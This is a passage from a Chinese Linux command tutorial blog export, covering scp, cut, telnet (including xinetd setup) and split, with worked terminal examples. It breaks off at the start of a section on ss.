    <content type="text"><![CDATA[Linux 命令- scp&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;scp是secure copy的简写，用于在Linux下进行远程拷贝文件的命令，和它类似的命令有cp，不过cp只是在本机进行拷贝不能跨服务器，而且scp传输是加密的。可能会稍微影响一下速度。当你服务器硬盘变为只读 read only system时，用scp可以帮你把文件移出来。另外，scp还非常不占资源，不会提高多少系统负荷，在这一点上，rsync就远远不及它了。虽然 rsync比scp会快一点，但当小文件众多的情况下，rsync会导致硬盘I/O非常高，而scp基本不影响系统正常使用。 1．命令格式1scp [参数] [原路径] [目标路径] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;scp是 secure copy的缩写, scp是linux系统下基于ssh登陆进行安全的远程文件拷贝命令。linux的scp命令可以在linux服务器之间复制文件和目录。 3．命令参数 -1 强制scp命令使用协议ssh1 -2 强制scp命令使用协议ssh2 -4 强制scp命令只使用IPv4寻址 -6 强制scp命令只使用IPv6寻址 -B 使用批处理模式（传输过程中不询问传输口令或短语） -C 允许压缩。（将-C标志传递给ssh，从而打开压缩功能） -p 保留原文件的修改时间，访问时间和访问权限。 -q 不显示传输进度条。 -r 递归复制整个目录。 -v 详细方式显示输出。scp和ssh(1)会显示出整个过程的调试信息。这些信息用于调试连接，验证和配置问题。 -c cipher 以cipher将数据传输进行加密，这个选项将直接传递给ssh。 -F ssh_config 指定一个替代的ssh配置文件，此参数直接传递给ssh。 -i identity_file 从指定文件中读取传输时使用的密钥文件，此参数直接传递给ssh。 -l limit 限定用户所能使用的带宽，以Kbit/s为单位。 -o ssh_option 如果习惯于使用ssh_config(5)中的参数传递方式， -P port 注意是大写的P, port是指定数据传输用到的端口号 -S program 指定加密传输时所使用的程序。此程序必须能够理解ssh(1)的选项。 4．使用实例scp命令的实际应用概述：从本地服务器复制到远程服务器：(1) 复制文件：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令格式： 1scp local_file remote_username@remote_ip:remote_folder &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者 1scp local_file remote_username@remote_ip:remote_file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者 1scp local_file remote_ip:remote_folder &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者 1scp local_file remote_ip:remote_file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第1,2个指定了用户名，命令执行后需要输入用户密码，第1个仅指定了远程的目录，文件名字不变，第2个指定了文件名 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第3,4个没有指定用户名，命令执行后需要输入用户名和密码，第3个仅指定了远程的目录，文件名字不变，第4个指定了文件名 (2) 复制目录：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令格式： 1scp -r local_folder remote_username@remote_ip:remote_folder &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者 1scp -r local_folder remote_ip:remote_folder &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第1个指定了用户名，命令执行后需要输入用户密码； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第2个没有指定用户名，命令执行后需要输入用户名和密码； 从远程服务器复制到本地服务器：&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从远程复制到本地的scp命令与上面的命令雷同，只要将从本地复制到远程的命令后面2个参数互换顺序就行了。 实例1：从远处复制文件到本地目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1scp root@192.168.120.204:/opt/soft/nginx-0.5.38.tar.gz /opt/soft/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728[root@localhost ~]# cd /opt/soft/[root@localhost soft]# ll总计 80072drwxr-xr-x 12 root root 4096 09-21 18:40 fms3.5drwxr-xr-x 3 root root 4096 09-21 17:58 fms4.5drwxr-xr-x 10 root root 4096 10-30 17:15 jdk1.6.0_16drwxr-xr-x 10 root root 4096 09-17 19:27 jdk1.6.0_16.bak-rwxr-xr-x 1 root root 81871260 2009-12-21 jdk-6u16-linux-x64.bindrwxrwxrwx 2 root root 4096 09-21 01:16 mysqldrwxr-xr-x 3 root root 4096 09-21 18:40 setup_filedrwxr-xr-x 9 root root 4096 09-17 19:23 tomcat6.0.32drwxr-xr-x 9 root root 4096 2012-08-14 tomcat_7.0[root@localhost soft]# scp root@192.168.120.204:/opt/soft/nginx-0.5.38.tar.gz /opt/soft/root@192.168.120.204's password: nginx-0.5.38.tar.gz 100% 479KB 478.7KB/s 00:00 [root@localhost soft]# ll总计 80556drwxr-xr-x 12 root root 4096 09-21 18:40 fms3.5drwxr-xr-x 3 root root 4096 09-21 17:58 fms4.5drwxr-xr-x 10 root root 4096 10-30 17:15 jdk1.6.0_16drwxr-xr-x 10 root root 4096 09-17 19:27 jdk1.6.0_16.bak-rwxr-xr-x 1 root root 81871260 2009-12-21 jdk-6u16-linux-x64.bindrwxrwxrwx 2 root root 4096 09-21 01:16 mysql-rw-r--r-- 1 root root 490220 03-15 09:11 nginx-0.5.38.tar.gzdrwxr-xr-x 3 root root 4096 09-21 18:40 setup_filedrwxr-xr-x 9 root root 4096 09-17 19:23 tomcat6.0.32drwxr-xr-x 9 root root 4096 2012-08-14 tomcat_7.0[root@localhost soft]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从192.168.120.204机器上的/opt/soft/的目录中下载nginx-0.5.38.tar.gz 文件到本地/opt/soft/目录中 实例2：从远处复制到本地&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1scp -r root@192.168.120.204:/opt/soft/mongodb /opt/soft/ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324252627282930313233343536373839404142[root@localhost soft]# ll总计 80556drwxr-xr-x 12 root root 4096 09-21 18:40 fms3.5drwxr-xr-x 3 root root 4096 09-21 17:58 fms4.5drwxr-xr-x 10 root root 4096 10-30 17:15 jdk1.6.0_16drwxr-xr-x 10 root root 4096 09-17 19:27 jdk1.6.0_16.bak-rwxr-xr-x 1 root root 81871260 2009-12-21 jdk-6u16-linux-x64.bindrwxrwxrwx 2 root root 4096 09-21 01:16 mysql-rw-r--r-- 1 root root 490220 03-15 09:11 nginx-0.5.38.tar.gzdrwxr-xr-x 3 root root 4096 09-21 18:40 setup_filedrwxr-xr-x 9 root root 4096 09-17 19:23 tomcat6.0.32drwxr-xr-x 9 root root 4096 2012-08-14 tomcat_7.0[root@localhost soft]# scp -r root@192.168.120.204:/opt/soft/mongodb /opt/soft/root@192.168.120.204's password: mongodb-linux-i686-static-1.8.5.tgz 100% 28MB 28.3MB/s 00:01 README 100% 731 0.7KB/s 00:00 THIRD-PARTY-NOTICES 100% 7866 7.7KB/s 00:00 mongorestore 100% 7753KB 7.6MB/s 00:00 mongod 100% 7760KB 7.6MB/s 00:01 mongoexport 100% 7744KB 7.6MB/s 00:00 bsondump 100% 7737KB 7.6MB/s 00:00 mongofiles 100% 7748KB 7.6MB/s 00:01 mongostat 100% 7808KB 7.6MB/s 00:00 mongos 100% 5262KB 5.1MB/s 00:01 mongo 100% 3707KB 3.6MB/s 00:00 mongoimport 100% 7754KB 7.6MB/s 00:00 mongodump 100% 7773KB 7.6MB/s 00:00 GNU-AGPL-3.0 100% 34KB 33.7KB/s 00:00 [root@localhost soft]# ll总计 80560drwxr-xr-x 12 root root 4096 09-21 18:40 fms3.5drwxr-xr-x 3 root root 4096 09-21 17:58 fms4.5drwxr-xr-x 10 root root 4096 10-30 17:15 jdk1.6.0_16drwxr-xr-x 10 root root 4096 09-17 19:27 jdk1.6.0_16.bak-rwxr-xr-x 1 root root 81871260 2009-12-21 jdk-6u16-linux-x64.bindrwxr-xr-x 3 root root 4096 03-15 09:18 mongodbdrwxrwxrwx 2 root root 4096 09-21 01:16 mysql-rw-r--r-- 1 root root 490220 03-15 09:11 nginx-0.5.38.tar.gzdrwxr-xr-x 3 root root 4096 09-21 18:40 setup_filedrwxr-xr-x 9 root root 4096 09-17 19:23 tomcat6.0.32drwxr-xr-x 9 root root 4096 2012-08-14 tomcat_7.0[root@localhost soft]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从192.168.120.204机器上的/opt/soft/中下载mongodb 目录到本地的/opt/soft/目录来。 实例3：上传本地文件到远程机器指定目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1scp /opt/soft/nginx-0.5.38.tar.gz root@192.168.120.204:/opt/soft/scptest &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617上传前目标机器的目标目录：[root@localhost soft]# cd scptest/[root@localhost scptest]# ll总计 0[root@localhost scptest]# ll本地机器上传：[root@localhost soft]# scp /opt/soft/nginx-0.5.38.tar.gz root@192.168.120.204:/opt/soft/scptestroot@192.168.120.204's password: nginx-0.5.38.tar.gz 100% 479KB 478.7KB/s 00:00 [root@localhost soft]# 上传后目标机器的目标目录：[root@localhost scptest]# ll总计 484-rw-r--r-- 1 root root 490220 03-15 09:25 nginx-0.5.38.tar.gz[root@localhost scptest]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;复制本地opt/soft/目录下的文件nginx-0.5.38.tar.gz 到远程机器192.168.120.204的opt/soft/scptest目录 实例4：上传本地目录到远程机器指定目录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1scp -r /opt/soft/mongodb root@192.168.120.204:/opt/soft/scptest &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728293031上传前目标机器的目标目录：[root@localhost ~]# cd /opt/soft/scptest/[root@localhost scptest]# ll总计 484-rw-r--r-- 1 root root 490220 03-15 09:25 nginx-0.5.38.tar.gz[root@localhost scptest]# 本地机器上传：[root@localhost ~]# scp -r /opt/soft/mongodb root@192.168.120.204:/opt/soft/scptestroot@192.168.120.204's password: mongodb-linux-i686-static-1.8.5.tgz 100% 28MB 28.3MB/s 00:01 README 100% 731 0.7KB/s 00:00 THIRD-PARTY-NOTICES 100% 7866 7.7KB/s 00:00 mongorestore 100% 7753KB 7.6MB/s 00:00 mongod 100% 7760KB 7.6MB/s 00:01 mongoexport 100% 7744KB 7.6MB/s 00:00 bsondump 100% 7737KB 7.6MB/s 00:00 mongofiles 100% 7748KB 7.6MB/s 00:00 mongostat 100% 7808KB 7.6MB/s 00:01 mongos 100% 5262KB 5.1MB/s 00:00 mongo 100% 3707KB 3.6MB/s 00:00 mongoimport 100% 7754KB 7.6MB/s 00:01 mongodump 100% 7773KB 7.6MB/s 00:00 GNU-AGPL-3.0 100% 34KB 33.7KB/s 00:00 [root@localhost ~]# 上传后目标机器的目标目录：[root@localhost scptest]# ll总计 488drwxr-xr-x 3 root root 4096 03-15 09:33 mongodb-rw-r--r-- 1 root root 490220 03-15 09:25 nginx-0.5.38.tar.gz[root@localhost scptest]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上传本地目录 /opt/soft/mongodb到远程机器192.168.120.204上/opt/soft/scptest的目录中去]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- cut]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F64.%20Linux%20%E5%91%BD%E4%BB%A4-%20cut%2F</url>
    <content type="text"><![CDATA[Linux 命令- cut&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cut命令用来显示行中的指定部分，删除文件中指定字段。cut经常用来显示文件的内容，类似于下的type命令。 1. 命令格式1cut [参数] [file] 2. 命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cut 命令从文件的每一行剪切字节、字符和字段并将这些字节、字符和字段写至标准输出。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果不指定 File 参数，cut 命令将读取标准输入。必须指定 -b、-c 或 -f 标志之一。 3. 命令参数 -b：仅显示行中指定直接范围的内容； -c：仅显示行中指定范围的字符； -d：指定字段的分隔符，默认的字段分隔符为“TAB”； -f：显示指定字段的内容； -n：与“-b”选项连用，不分割多字节字符； –complement：补足被选择的字节、字符或字段； –out-delimiter=&lt;字段分隔符&gt;：指定输出内容是的字段分割符； –help：显示指令的帮助信息 –version：显示指令的版本信息。 4. 使用实例实例1：截取文件其中一个字符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cut -c2 /etc/passwd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost ~]# cut -c2 /etc/passwdoiadpyhaapatoyybososh &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;提取第2个字符 实例2：截取文件多个字符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cut -c2-5,10 /etc/passwd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost ~]# cut -c2-5,10 /etc/passwdoot:0in:x:aemo2dm:x:p:x:lync:0hutdxalt:0ail:1peraxames2tp:x5obod9ysteuysteebus::olki:ss:x5ostf:shd::hron9 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;提取第2、第3、第4、第5和第10个字符 实例3：提取前4个字符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cut -c-4 /etc/passwd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost ~]# cut -c-4 /etc/passwdrootbin:daemadm:lp:xsyncshuthaltmailopergameftp:nobosystsystdbuspolktss:postsshdchro 实例4：打印从第10个字符开始到结尾&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cut -c10- /etc/passwd &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122[root@localhost ~]# cut -c5- /etc/passwd:x:0:0:root:/root:/bin/bashx:1:1:bin:/bin:/sbin/nologinon:x:2:2:daemon:/sbin:/sbin/nologinx:3:4:adm:/var/adm:/sbin/nologin:4:7:lp:/var/spool/lpd:/sbin/nologin:x:5:0:sync:/sbin:/bin/syncdown:x:6:0:shutdown:/sbin:/sbin/shutdown:x:7:0:halt:/sbin:/sbin/halt:x:8:12:mail:/var/spool/mail:/sbin/nologinator:x:11:0:operator:/root:/sbin/nologins:x:12:100:games:/usr/games:/sbin/nologinx:14:50:FTP User:/var/ftp:/sbin/nologindy:x:99:99:Nobody:/:/sbin/nologinemd-bus-proxy:x:999:997:systemd Bus Proxy:/:/sbin/nologinemd-network:x:192:192:systemd Network Management:/:/sbin/nologin:x:81:81:System message bus:/:/sbin/nologinitd:x:998:996:User for polkitd:/:/sbin/nologinx:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologinfix:x:89:89::/var/spool/postfix:/sbin/nologin:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologinny:x:997:995::/var/lib/chrony:/sbin/nologin 实例5：用 -f 提取指定字段，-d 指定分隔符&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12cut -f1 -d" " test.txtcut -f2,3 -d" " test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415[root@localhost ~]# cat test.txtNo Name Mark Percent01 tom 69 9102 jack 71 8703 alex 68 98[root@localhost ~]# cut -f1 -d" " test.txtNo010203[root@localhost ~]# cut -f2,3 -d" " test.txtName Marktom 69jack 71alex 68 实例6：使用 –complement 提取指定字段之外的列&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1cut -f2 -d" " --complement test.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# cat test.txt No Name Mark Percent01 tom 69 9102 jack 71 8703 alex 68 98[root@localhost ~]# cut -f2 -d" " --complement test.txtNo Mark Percent01 69 9102 71 8703 68 98]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- telnet]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F60.%20Linux%20%E5%91%BD%E4%BB%A4-%20telnet%2F</url>
    <content type="text"><![CDATA[Linux 命令- telnet&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;telnet命令通常用来远程登录。telnet程序是基于TELNET协议的远程登录客户端程序。Telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的 能力。在终端使用者的电脑上使用telnet程序，用它连接到服务器。终端使用者可以在telnet程序中输入命令，这些命令会在服务器上运行，就像直接在服务器的控制台上输入一样。可以在本地就能控制服务器。要开始一个 telnet会话，必须输入用户名和密码来登录服务器。Telnet是常用的远程控制Web服务器的方法。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但是，telnet因为采用明文传送报文，安全性不好，很多Linux服务器都不开放telnet服务，而改用更安全的ssh方式了。但仍然有很多别的系统可能采用了telnet方式来提供远程登录，因此弄清楚telnet客户端的使用方式仍是很有必要的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;telnet命令还可做别的用途，比如确定远程服务的状态，比如确定远程服务器的某个端口是否能访问。 1．命令格式1telnet [参数] [主机] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行telnet指令开启终端机阶段作业，并登入远端主机。 3．命令参数 -8 允许使用8位字符资料，包括输入与输出。 -a 尝试自动登入远端系统。 -b&lt;主机别名&gt; 使用别名指定远端主机名称。 -c 不读取用户专属目录里的.telnetrc文件。 -d 启动排错模式。 -e&lt;脱离字符&gt; 设置脱离字符。 -E 滤除脱离字符。 -f 此参数的效果和指定”-F”参数相同。 -F 使用Kerberos V5认证时，加上此参数可把本地主机的认证数据上传到远端主机。 -k&lt;域名&gt; 使用Kerberos认证时，加上此参数让远端主机采用指定的领域名，而非该主机的域名。 -K 不自动登入远端主机。 -l&lt;用户名称&gt; 指定要登入远端主机的用户名称。 -L 允许输出8位字符资料。 -n&lt;记录文件&gt; 指定文件记录相关信息。 -r 使用类似rlogin指令的用户界面。 -S&lt;服务类型&gt; 设置telnet连线所需的IP TOS信息。 -x 假设主机有支持数据加密的功能，就使用它。 -X&lt;认证形态&gt; 关闭指定的认证形态。 4．使用实例实例1：远程服务器无法访问&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1telnet 192.168.120.206 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost ~]# telnet 192.168.120.209Trying 192.168.120.209...telnet: connect to address 192.168.120.209: No route to hosttelnet: Unable to connect to remote host: No route to host[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;处理这种情况方法： 确认ip地址是否正确？ 确认ip地址对应的主机是否已经开机？ 如果主机已经启动，确认路由设置是否设置正确？（使用route命令查看） 如果主机已经启动，确认主机上是否开启了telnet服务？（使用netstat命令查看，TCP的23端口是否有LISTEN状态的行） 如果主机已经启动telnet服务，确认防火墙是否放开了23端口的访问？（使用iptables-save查看） 实例2：域名无法解析&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1telnet www.baidu.com &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123[root@localhost ~]# telnet www.baidu.comwww.baidu.com/telnet: Temporary failure in name resolution[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;处理这种情况方法： 确认域名是否正确 确认本机的域名解析有关的设置是否正确（/etc/resolv.conf中nameserver的设置是否正确，如果没有，可以使用nameserver 8.8.8.8） 确认防火墙是否放开了UDP53端口的访问（DNS使用UDP协议，端口53，使用iptables-save查看） 实例3：拒绝访问&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost ~]# telnet 192.168.120.206Trying 192.168.120.206...telnet: connect to address 192.168.120.206: Connection refusedtelnet: Unable to connect to remote host: Connection refused[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;处理这种情况： 确认ip地址或者主机名是否正确？ 确认端口是否正确，是否默认的23端口 实例4：启动telnet服务&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1service xinetd restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728293031323334353637[root@localhost ~]# cd /etc/xinetd.d/[root@localhost xinetd.d]# ll总计 124-rw-r--r-- 1 root root 1157 2011-05-31 chargen-dgram-rw-r--r-- 1 root root 1159 2011-05-31 chargen-stream-rw-r--r-- 1 root root 523 2009-09-04 cvs-rw-r--r-- 1 root root 1157 2011-05-31 daytime-dgram-rw-r--r-- 1 root root 1159 2011-05-31 daytime-stream-rw-r--r-- 1 root root 1157 2011-05-31 discard-dgram-rw-r--r-- 1 root root 1159 2011-05-31 discard-stream-rw-r--r-- 1 root root 1148 2011-05-31 echo-dgram-rw-r--r-- 1 root root 1150 2011-05-31 echo-stream-rw-r--r-- 1 root root 323 2004-09-09 eklogin-rw-r--r-- 1 root root 347 2005-09-06 ekrb5-telnet-rw-r--r-- 1 root root 326 2004-09-09 gssftp-rw-r--r-- 1 root root 310 2004-09-09 klogin-rw-r--r-- 1 root root 323 2004-09-09 krb5-telnet-rw-r--r-- 1 root root 308 2004-09-09 kshell-rw-r--r-- 1 root root 317 2004-09-09 rsync-rw-r--r-- 1 root root 1212 2011-05-31 tcpmux-server-rw-r--r-- 1 root root 1149 2011-05-31 time-dgram-rw-r--r-- 1 root root 1150 2011-05-31 time-stream[root@localhost xinetd.d]# cat krb5-telnet # default: off# description: The kerberized telnet server accepts normal telnet sessions, \# but can also use Kerberos 5 authentication.service telnet&#123; flags = REUSE socket_type = stream wait = no user = root server = /usr/kerberos/sbin/telnetd log_on_failure += USERID disable = yes&#125;[root@localhost xinetd.d]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;配置参数，通常的配置如下： 123456789101112131415161718192021222324252627service telnet &#123; disable = no #启用 flags = REUSE #socket可重用 socket_type = stream #连接方式为TCP wait = no #为每个请求启动一个进程 user = root #启动服务的用户为root server = /usr/sbin/in.telnetd #要激活的进程 log_on_failure += USERID #登录失败时记录登录用户名 &#125; 如果要配置允许登录的客户端列表，加入 only_from = 192.168.0.2 #只允许192.168.0.2登录 如果要配置禁止登录的客户端列表，加入 no_access = 192.168.0.&#123;2,3,4&#125; #禁止192.168.0.2、192.168.0.3、192.168.0.4登录 如果要设置开放时段，加入 access_times = 9:00-12:00 13:00-17:00 # 每天只有这两个时段开放服务（我们的上班时间：P） 如果你有两个IP地址，一个是私网的IP地址如192.168.0.2，一个是公网的IP地址如218.75.74.83，如果你希望用户只能从私网来登录telnet服务，那么加入 bind = 192.168.0.2 各配置项具体的含义和语法可参考xined配置文件属性说明（man xinetd.conf） 配置端口，修改services文件：# vi /etc/services 找到以下两句 telnet 23/tcp telnet 23/udp 如果前面有#字符，就去掉它。telnet的默认端口是23，这个端口也是黑客端口扫描的主要对象，因此最好将这个端口修改掉，修改的方法很简单，就是将23这个数字修改掉，改成大一点的数字，比如61123。注意，1024以下的端口号是internet保留的端口号，因此最好不要用，还应该注意不要与其它服务的端口冲突。 启动服务：service xinetd restart 实例5：正常telnet&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1telnet 192.168.120.204 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@andy ~]# telnet 192.168.120.204Trying 192.168.120.204...Connected to 192.168.120.204 (192.168.120.204).Escape character is '^]'. localhost (Linux release 2.6.18-274.18.1.el5 #1 SMP Thu Feb 9 12:45:44 EST 2012) (1)login: rootPassword: Login incorrect &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一般情况下不允许root从远程登录，可以先用普通账号登录，然后再用su -切到root用户。]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- split]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F69.%20Linux%20%E5%91%BD%E4%BB%A4-%20split%2F</url>
    <content type="text"><![CDATA[Linux 命令- split&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;split 命令用于将一个文件分割成数个。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;该指令将大文件分割成较小的文件，在默认情况下将按照每1000行割成一个小文件。 1. 命令语法1split [参数] [要切割的文件] [输出文件名] 2. 命令参数 &lt;行数&gt; : 指定每多少行切成一个小文件 -b&lt;字节&gt; : 指定每多少字节切成一个小文件 –help : 在线帮助 –version : 显示版本信息 -C&lt;字节&gt; : 与参数”-b”相似，但是在切 割时将尽量维持每行的完整性 [输出文件名] : 设置切割后文件的前置文件名， split会自动在前置文件名后再加上编号 3. 使用实例实例1：使用 split 将文件 README 每6行切割成一个文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1split -6 README &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123$ split -6 README$ ls README xaa xad xag xab xae xah xac xaf xai &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果 split 不指定目标文件名，则会以 xaa、xab……这样的文件名来存取切割后的文件，也可以指定文件名。 实例2：使用 split 将文件 README 以每500字节切割&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1split -b500 README &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123$ split -b500 README$ ls README xaa xad xag xab xae xah xac xaf xai]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- ss]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%91%BD%E4%BB%A4%2F59.%20Linux%20%E5%91%BD%E4%BB%A4-%20ss%2F</url>
    <content type="text"><![CDATA[Linux 命令- ss&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ss是Socket Statistics的缩写。顾名思义，ss命令可以用来获取socket统计信息，它可以显示和netstat类似的内容。但ss的优势在于它能够显示更多更详细的有关TCP和连接状态的信息，而且比netstat更快速更高效。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当服务器的socket连接数量变得非常大时，无论是使用netstat命令还是直接cat /proc/net/tcp，执行速度都会很慢。可能你不会有切身的感受，但请相信我，当服务器维持的连接达到上万个的时候，使用netstat等于浪费 生命，而用ss才是节省时间。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;天下武功唯快不破。ss快的秘诀在于，它利用到了TCP协议栈中tcp_diag。tcp_diag是一个用于分析统计的模块，可以获得Linux 内核中第一手的信息，这就确保了ss的快捷高效。当然，如果你的系统中没有tcp_diag，ss也可以正常运行，只是效率会变得稍慢。（但仍然比 netstat要快。） 1.命令格式12ss [参数]ss [参数] [过滤] 2.命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ss(Socket Statistics的缩写)命令可以用来获取 socket统计信息，此命令输出的结果类似于 netstat输出的内容，但它能显示更多更详细的 TCP连接状态的信息，且比 netstat 更快速高效。它使用了 TCP协议栈中 tcp_diag（是一个用于分析统计的模块），能直接从获得第一手内核信息，这就使得 ss命令快捷高效。在没有 tcp_diag，ss也可以正常运行。 3.命令参数 -h, –help 帮助信息 -V, –version 程序版本信息 -n, –numeric 不解析服务名称 -r, –resolve 解析主机名 -a, –all 显示所有套接字（sockets） -l, –listening 显示监听状态的套接字（sockets） -o, –options 显示计时器信息 -e, –extended 显示详细的套接字（sockets）信息 -m, –memory 显示套接字（socket）的内存使用情况 -p, –processes 显示使用套接字（socket）的进程 -i, –info 显示 TCP内部信息 -s, –summary 显示套接字（socket）使用概况 -4, –ipv4 仅显示IPv4的套接字（sockets） -6, –ipv6 仅显示IPv6的套接字（sockets） -0, –packet 显示 PACKET 套接字（socket） -t, –tcp 仅显示 TCP套接字（sockets） -u, –udp 仅显示 UCP套接字（sockets） -d, –dccp 仅显示 DCCP套接字（sockets） -w, –raw 仅显示 RAW套接字（sockets） -x, –unix 仅显示 Unix套接字（sockets） -f, –family=FAMILY 显示 FAMILY类型的套接字（sockets），FAMILY可选，支持 unix, inet, inet6, link, netlink -A, –query=QUERY, –socket=QUERY QUERY := {all|inet|tcp|udp|raw|unix|packet|netlink}[,QUERY] -D, –diag=FILE 将原始TCP套接字（sockets）信息转储到文件 -F, –filter=FILE 从文件中都去过滤器信息 FILTER := [ state TCP-STATE ] [ EXPRESSION ] 4.使用实例实例1：显示TCP连接&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1ss -t -a &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost ~]# ss -t -aState Recv-Q Send-Q Local Address:Port Peer Address:Port LISTEN 0 0 127.0.0.1:smux *:* LISTEN 0 0 *:3690 *:* LISTEN 0 0 *:ssh *:* ESTAB 0 0 192.168.120.204:ssh 10.2.0.68:49368 [root@localhost ~]# 实例2：显示 Sockets 